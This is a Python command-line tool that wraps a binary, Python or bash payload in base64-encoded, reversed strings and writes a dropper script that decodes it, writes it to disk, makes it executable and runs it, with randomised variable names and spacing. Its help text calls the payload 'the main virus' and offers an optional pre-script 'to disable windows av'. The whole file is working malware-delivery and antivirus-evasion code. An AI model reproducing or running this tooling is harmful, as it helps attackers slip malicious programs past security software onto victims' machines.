#!/usr/bin/env python3
import argparse
import blessed
import base64
import os
import sys
import random
import string

logo = """
██████      █████     █ ██████
█     █  ██          █        █
       █               █          █
█      █  ██      █          █
█      █   ██         █          █
█      █  █          █          █
█     █    ██        █        █
██ ███      █████     █ ██ ███ 
"""
def info(msg):
    print(f"{ter.green}⚡{msg}⚡")
def error(msg):
    print(f"{ter.red}ERROR:{msg}{ter.normal}")
    sys.exit(1)
def file_check(file):
    if os.path.isfile(args.obfuscate):
        info("File found")
        not_obfuscated = open(args.obfuscate, 'rb').read()
        info("File prepared for processing")
        return not_obfuscated
    else:
        error(f"ERROR:File {args.obfuscate} Doesn't exist")
        sys.exit(1)


def randomize():
    return f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}",random.choice(['"', "'", '"""'])

class main:

   
   def bash(args):
    not_obfuscated = file_check(args.obfuscate)
    info("Generating obfuscated code")
    
    obfuscated = base64.b64encode(not_obfuscated)
    var1,close = randomize()
    new_line = "\n"

    if args.pre_script:
        if os.path.isfile(args.pre_script):

            pre_script = open(args.pre_script, 'rb').read()
            pre_script = base64.b64encode(pre_script)
            var2 = f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}" 

            obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
import os {new_line * random.randint(0,2)}
{var2} = base64.b64decode({close}{pre_script.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
exec({var2}) {new_line * random.randint(0,1)}
{random.choice(['os.system(', 'os.popen('])}{var1}) {new_line * random.randint(0,2)}"""


        else:
            print(f"{ter.red}ERROR:File {args.pre_script} Doesn't exist{ter.normal}")
            sys.exit(1)


    else:
          obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
import os {new_line * random.randint(0,2)}
{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
{random.choice(['os.system(', 'os.popen('])}{var1}) {new_line * random.randint(0,2)}"""



    info("Code obfuscated")

    with open(args.out, "w") as output:
        output.write(obfuscated_code)

    print(f"{ter.green}⚑Obfuscated code written to: {args.out}⚑{ter.normal}")








   def binary(args):
    not_obfuscated = file_check(args.obfuscate)
    info("Generating obfuscated code")
    obfuscated = base64.b64encode(not_obfuscated)
    var1,close = randomize()
    new_line = "\n"
    if not args.os:
        error("You need to define operating system when using binary format (windows,linux)")
    if args.os.lower() == "windows":
        name = 'dump.exe'
        access = ""
        execution = name.split('.')[0]
    elif args.os.lower() == "linux":
        name = 'dump'
        access = random.choice([f'chmod 777 {name} && ', f'chmod +x {name} && '])
        execution = f'./{name}'
    else:
        error(f"Invalid OS:{args.os} Supported OSes:windows, linux")

    if args.pre_script:
        if os.path.isfile(args.pre_script):

            pre_script = open(args.pre_script, 'rb').read()
            pre_script = base64.b64encode(pre_script)
            var2 = f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}" 

            obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
import os {new_line * random.randint(0,2)}
{var2} = base64.b64decode({close}{pre_script.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]) {new_line * random.randint(0,1)}
exec({var2}) {new_line * random.randint(0,1)}
open('{name}', 'wb').write({var1}) {new_line * random.randint(0,2)}
{random.choice(['os.system("', 'os.popen("'])}{access}{execution}"){new_line * random.randint(0,1)}"""


        else:
            print(f"{ter.red}ERROR:File {args.pre_script} Doesn't exist{ter.normal}")
            sys.exit(1)


    else:
          obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
import os {new_line * random.randint(0,2)}
{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]) {new_line * random.randint(0,1)}
open('{name}', 'wb').write({var1})  {new_line * random.randint(0,2)}
{random.choice(['os.system("', 'os.popen("'])}{access}{execution}"){new_line * random.randint(0,1)}"""

    info("Code obfuscated")

    with open(args.out, "w") as output:
        output.write(obfuscated_code)

    print(f"{ter.green}⚑Obfuscated code written to: {args.out}⚑{ter.normal}")















   def python(args):
    not_obfuscated = file_check(args.obfuscate)
    info("Generating obfuscated code")
    
    obfuscated = base64.b64encode(not_obfuscated)
    var1,close = randomize()
    new_line = "\n"

    if args.pre_script:
        if os.path.isfile(args.pre_script):

            pre_script = open(args.pre_script, 'rb').read()
            pre_script = base64.b64encode(pre_script)
            var2 = f"{random.choice(list(string.ascii_lowercase)) * random.randint(1,10)}{random.randint(1,99999) +1}" 

            obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
{var2} = base64.b64decode({close}{pre_script.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
exec({var2}) {new_line * random.randint(0,1)}
exec({var1}) {new_line * random.randint(0,2)}"""


        else:
            print(f"{ter.red}ERROR:File {args.pre_script} Doesn't exist{ter.normal}")
            sys.exit(1)


    else:
          obfuscated_code = f"""import base64 {new_line * random.randint(0,2)}
{var1} = base64.b64decode({close}{obfuscated.decode()[::-1]}{close}[::-1]).decode() {new_line * random.randint(0,1)}
exec({var1}) {new_line * random.randint(0,2)}"""



    info("Code obfuscated")

    with open(args.out, "w") as output:
        output.write(obfuscated_code)

    print(f"{ter.green}⚑Obfuscated code written to: {args.out}⚑{ter.normal}")


if __name__ == "__main__":
    ter = blessed.Terminal()
    globals()['ter'] = ter
    print(ter.green + logo + ter.normal)
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", '--obfuscate', help='File to obfuscate.', required=True)
    parser.add_argument("-p", '--pre-script', help='Python script to run before executing the main virus (to for example disable windows av).', required=False)
    parser.add_argument("-f", '--format', help='What format is the target file (binary,python,bash)', required=True)
    parser.add_argument("--os", help='Target operating system.', required=False)
    parser.add_argument("--out", help='Output obfuscated code to.', required=True)
    args = parser.parse_args()
    if args.format.lower() == 'python':
       main.python(args)
    elif args.format.lower() == 'binary':
       main.binary(args)
    elif args.format.lower() == 'bash':
        main.bash(args)
    else:
       error(f"Invalid format {args.format.lower()}, valid formats are:binary,python")
